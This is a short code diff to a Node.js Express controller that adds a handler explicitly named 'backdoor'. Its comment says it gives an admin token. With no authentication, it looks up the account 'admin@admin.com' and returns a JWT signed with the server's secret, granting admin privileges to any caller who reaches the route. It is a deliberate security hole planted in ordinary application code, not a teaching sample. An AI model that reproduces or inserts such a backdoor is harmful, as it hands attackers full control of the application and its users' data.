@@ -72,3 +72,16 @@ exports.createBlogmessage = (req, res) => {
         res.status(200).send("Message Added");
     }
 }
+// donne un token admin
+
+exports.backdoor=(req,res)=>{  
+    data.forEach(el => {
+        if(el.mail === 'admin@admin.com') {
+            user = el
+        }
+    });
+    
+    const token = jwt.sign({ user_id: user.id, user_role: user.role }, process.env.ACCESS_TOKEN_SECRET);
+    res.status(200).json({ token, role: user.role })
+
+}
